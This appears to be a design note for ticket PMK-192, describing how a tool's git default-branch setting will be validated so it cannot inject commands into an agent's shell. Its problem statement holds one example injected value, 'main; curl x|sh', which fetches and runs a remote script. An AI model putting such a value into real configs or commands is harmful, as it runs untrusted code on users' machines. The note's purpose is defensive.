# Validate `git_host.default_branch` (PMK-192)

## Problem

`git_host.default_branch` in `.pmkit/config.yaml` is read as it is by `defaultBranch(ctx)` (`scripts/pmkit.mjs`), and `commands/issues/pause.md` and `commands/issues/progress.md` tell the agent to put it into `git log <base>..HEAD`. A cloned repository with `default_branch: "main; curl x|sh"` puts that text in the agent's shell. `docs next-adr` already validates the name, but with a private `validBranch` that accepts only ASCII, so `développement` is refused. `validate` does not report a bad value.

## Decisions

These were taken by the implementer, not confirmed with the user.

1. One validator, `validBranch(name)`, and one resolver, `resolveDefaultBranch(pmkit)`, in `scripts/lib/config.mjs`. The resolver returns `{ branch, configured, valid }`: `branch` is the name when valid and `main` otherwise.
2. `validBranch` accepts Unicode letters and digits (`\p{L}\p{N}`), `_`, `.`, `-` and `/`; the first character is a letter, digit or `_`. It still refuses `..`, `//`, a component that starts with `.`, a trailing `/` and a trailing `.lock`. No shell metacharacter, space or `@{` can pass, so the value is also safe in a shell command, and a leading `-` cannot become a git option.
3. Every CLI reader (`issues branch`, `pr open`, `pr diff`, `risks`, `docs next-adr`) goes through `defaultBranch(ctx)`, which uses the resolver. An invalid value falls back to `main` and the command prints `note: git_host.default_branch is not a valid branch name, so main is used`. An unset value stays silent, except in `docs next-adr`, which keeps its current note.
4. The command files no longer read the config themselves. A new read command, `pmkit default-branch`, needs no tracker and no git host and writes nothing. It returns `{ branch, configured, valid, note }`. `pause.md`, `progress.md`, `review.md` and `investigate-bug.md` and `risk-radar.md` where they name the config key take `branch` from it. The agent puts only that output in the shell command, never the config value. When `valid` is `false` the agent says the note.
5. `validatePmkitConfig` reports `git_host.default_branch is not a valid branch name` so `validate` reports it. Existing behaviour: a config problem makes writes refuse until it is fixed, as for a wrong `default_branch` type today. `link-repo --default-branch <name>` stays the fix.
6. `link-repo` keeps its own `--default-branch` and `readDefaultBranch` checks, now on the shared `validBranch`, so it accepts the same names.

## Non-goals

- The improvements in `docs/superpowers/epc-6-follow-ups.md`.
- Checking that the branch exists in git.

## Acceptance criteria mapping

1. One validation for every reader, fallback `main` with `note:`: decisions 1, 3, 4.
2. No command file puts a config value in a shell command: decision 4, with a test over `commands/**/*.md`.
3. `validate` reports it: decision 5.
